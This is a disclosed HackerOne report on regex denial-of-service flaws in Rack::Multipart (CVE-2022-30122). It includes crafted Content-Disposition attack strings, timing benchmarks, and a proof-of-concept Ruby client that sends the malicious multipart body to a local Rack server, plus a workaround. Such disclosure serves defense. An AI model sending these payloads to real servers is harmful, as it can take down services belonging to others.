---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - stack/ruby
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2023-07-28
submitted: 2022-02-22T22:34:07.663Z
bounty_usd: null
votes: 18
cve: "CVE-2022-30122"
program: "[[programs/rails|Ruby on Rails]]"
reporter: "ooooooo_q"
source: "https://hackerone.com/reports/1489141"
title: "ReDoS in Rack::Multipart"
---
# ReDoS in Rack::Multipart

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 18 | **Program:** Ruby on Rails | **Disclosed:** 2023-07-28

- Report: [https://hackerone.com/reports/1489141](https://hackerone.com/reports/1489141)
- CWE: N/A | CVE: CVE-2022-30122
- Submitted: 2022-02-22T22:34:07.663Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello, I found ReDoS on Rack.

I found this problem using `recheck` (https://makenowjust-labs.github.io/recheck/), a ReDoS detection tool.

This tool has found multiple places where there seems to be a problem with the rack code, but since there are many and it takes time to check the behavior, I will first report on `Rack::Multipart::RFC2183`, which is the most dangerous.
This is detected as exponential by recheck.

- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart.rb#L38
- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L296

```ruby
❯ bundle exec irb
irb(main):001:0> require 'rack'
=> true
irb(main):002:0> Rack::Multipart::RFC2183
=> /^(?i-mx:Content-Disposition:\s*(?-mix:[^\s()<>,;:\\"\/\[\]?=]+)\s*)((?-mix:;\s*(?:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?-mix:\*[0-9]+)?))=((?-mix:"(?:\\"|[^"])*"|(?-mix:[^\s()<>,;:\\"\/\[\]?=]+))))|(?-mix:(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)(?:\*0)?\*))=((?-mix:[a-zA-Z0-9\-]*'[a-zA-Z0-9\-]*'(?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*)))|(?-mix:((?-mix:(?-mix:(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%])+)\*[1-9][0-9]*\*))=((?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \t\v\n\r)(><@,;:\\"\/\[\]?='*%]))*))))\s*))+$/i
```


### benchmark

rfc2183_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::RFC2183

def attack_text(length)
 "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * length + '='
end

Benchmark.bm do |x|
  x.report { attack_text(5)[regexp] }
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(15)[regexp] }
  x.report { attack_text(20)[regexp] }
  x.report { attack_text(25)[regexp] }
  x.report { attack_text(26)[regexp] }
end
```

```
❯ bundle exec ruby rfc2183_benchmark.rb
       user     system      total        real
   0.000018   0.000004   0.000022 (  0.000016)
   0.000357   0.000000   0.000357 (  0.000361)
   0.010888   0.000018   0.010906 (  0.010961)
   0.342814   0.000717   0.343531 (  0.344750)
  10.925193   0.022059  10.947252 ( 10.979092)
  21.906178   0.049380  21.955558 ( 22.024203)
```


### PoC

Gemfile

```ruby
# frozen_string_literal: true

source "https://rubygems.org"

gem 'rack', '~> 2.2', '>= 2.2.3'
gem 'puma', '~> 5.6', '>= 5.6.2'
```

config.ru

```ruby
class Server
  def call(env)
    Rack::Request.new(env).params

    [ 200, {}, []]
  end
end

run Server.new
```

```ruby
require "net/http"
require "uri"

class Net::HTTPGenericRequest

  def encode_multipart_form_data(out, params, opt)
    charset = opt[:charset]
    boundary = opt[:boundary]
    buf = ''
    params.each do |key, value|
      buf << "--#{boundary}\r\n"
      buf << "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * 27 + '='
      buf << "Content-Type: application/octet-stream\r\n\r\n"

      buf << "content"
      buf << "\r\n"
    end
    buf << "--#{boundary}--\r\n"
    flush_buffer(out, buf, false)
  end
end  

data = [["dummy"]]

url = URI.parse('http://127.0.0.1:9292/')
req = Net::HTTP::Post.new(url.path)
req.set_form(data, "multipart/form-data")

res = Net::HTTP.new(url.host, url.port).start do |http|
  http.request(req)
end
```

`bundle exec rackup` & `bundle exec ruby rfc2183_request.rb`

## Impact

When the client sends a specially crafted header, it occur ReDoS on the server side.
I confirmed that the combination of puma, unicorn, puma + nginx, unicorn + nginx occur Redos.

There are several other places where `Rack::Multipart` is likely to be ReDoS, and it seems good to exclude it as a workaround if user do not use file upload.

#### work around

```ruby
class Rack::Request
  def parse_multipart
    nil
  end
end
```

## Timeline

- **Report Filed**
- **2022-02-23** @ooooooo_q: I checked `Rack::Multipart::BROKEN_QUOTED` and `Rack::Multipart::BROKEN_UNQUOTED` in the same way.

- https://github.com/rack/rack/tree/2.2.3/lib/rack/multipart.rb#L19
- https://github.com/rack/rack/tree/2.2.3/lib/rack/multipart.rb#L20
- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L304

broken_quoted_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::BROKEN_QUOTED

def attack_text(length)
  "Content-Disposition:a" + "\t" * length + "filename=\"\";" + "\ta=;filename=\"" * length + "\ta="
end

Benchmark.bm do |x|
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(100)[regexp] }
  x.report { attack_text(500)[regexp] }
end
```

```
❯ bundle exec ruby broken_quoted_benchmark.rb
       user     system      total        real
   0.000086   0.000000   0.000086 (  0.000085)
   0.066192   0.000181   0.066373 (  0.066544)
   8.099961   0.026991   8.126952 (  8.153716)
```

broken_unquoted_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::BROKEN_UNQUOTED

def attack_text(length)
  'Content-Disposition:a' + "\t" * length + "\tfilename=m"
end

Benchmark.bm do |x|
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(100)[regexp] }
  x.report { attack_text(1000)[regexp] }
  x.report { attack_text(10000)[regexp] }
  x.report { attack_text(100000)[regexp] }
end
```

```
❯ bundle exec ruby broken_unquoted_benchmark.rb
       user     system      total        real
   0.000006   0.000000   0.000006 (  0.000005)
   0.000035   0.000000   0.000035 (  0.000035)
   0.002508   0.000045   0.002553 (  0.002569)
   0.246365   0.000167   0.246532 (  0.247299)
  25.003012   0.064393  25.067405 ( 25.146015)
```  

`Rack::Multipart::BROKEN_UNQUOTED` is detected as `2nd degree polynomial` by `recheck`, and it seems that 10kb ~ 100kb are required to make it an attack.

When I tried it, even if nginx is used, it seems to be treated as a body size limit (1Mb) if it is in multipart, unlike the http header size limit.

There are other regular expressions that are detected as `2nd degree polynomial`, so they are likely to be affected in the same way.
- **Report Triaged**
- **Cve Id Added**
- **Report Resolved**
- **2022-06-09** @ooooooo_q: @tenderlove 
I have confirmed that Rack::Multipart::BROKEN_QUOTED and Rack::Multipart::BROKEN_UNQUOTED have been fixed in Rack 2.2.3.1.

I see that this has not been fixed for Rack::Multipart::RFC2183, will this be fixed in a other process, or should I have made it as a separate report in hackerone?
- **2022-07-04** @ooooooo_q: @tenderlove @rails
Should it be created as a separate report?
- **Agreed On Going Public**
- **2023-07-16** @ooooooo_q: @rafaelfranca 

The PoC in this report contains CVE-2022-44572(https://hackerone.com/reports/1639882), is it safe to disclose?
- **Report Became Public**
